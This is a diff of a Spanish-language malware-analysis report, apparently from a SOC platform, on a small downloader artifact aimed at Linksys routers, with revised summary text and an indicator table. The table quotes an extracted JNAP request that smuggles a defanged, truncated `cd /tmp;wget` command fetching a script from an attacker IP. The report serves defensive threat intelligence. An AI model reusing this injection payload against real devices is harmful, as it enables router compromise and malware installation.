@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 444 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:42:54+00:00`
+- **Registrado:** `2026-08-09T19:42:54.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,12 +51,12 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.175.XXX | static_analysis |
-| ip | 91.92.40.XXX | static_analysis |
-| url | hxxp://91.92.40.XXX/wget.sh | strings |
 | url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
-| hash | 392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200 | static_analysis |
+| url | hxxp://91.92.40.XXX/wget.sh | strings |
+| ip | 91.92.40.XXX | static_analysis |
+| ip | 190.179.175.XXX | static_analysis |
 | command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w | strings |
+| hash | 392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200 | static_analysis |
 | ip | 45.156.87.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
